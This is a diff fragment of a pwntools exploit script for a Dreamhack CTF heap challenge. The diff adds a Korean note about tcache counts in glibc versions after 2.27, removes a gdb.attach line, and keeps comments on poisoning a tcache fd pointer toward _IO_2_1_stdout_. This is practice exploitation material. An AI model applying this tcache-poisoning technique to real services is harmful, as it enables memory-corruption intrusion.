@@ -18,6 +18,11 @@ else:
     HOST = int(input("Host: "))
     p = remote("host"+str(HOST)+".dreamhack.games", PORT)
     libc = ELF("./libc-2.27.so")
+"""
+glibc 기준 2.27 버전 이후에는 tcache_entry의 key 이외에도
+각 index에 몇 번이나 들어갔는지를 세는 counts도 들어가기 때문에
+이상의 버전에서는 이를 고려한 pwn을 진행해야 한다.
+"""
 
 
 def alloc(size, data):
@@ -60,8 +65,6 @@ alloc(0x30, p64(addr_stdout))
 # X'의 data 영역에 addr_stdout이 쓰이게 되고
 # 이는 곧 X의 fd가 되고, tcache에는 다음에 할당되어야 할 chunk의 주소로써 들어가게 된다.
 # 현재 tcache: (1) X -> (2) (stdout -> __IO_2_1_stdout_)
-
-gdb.attach(p)
 
 # [4] fd에 stdout을 넣어 그 다음인 _IO_2_1_stdout_으로 연결
 # libc-2.27.so에서 stdout의 하위 3바이트는 760
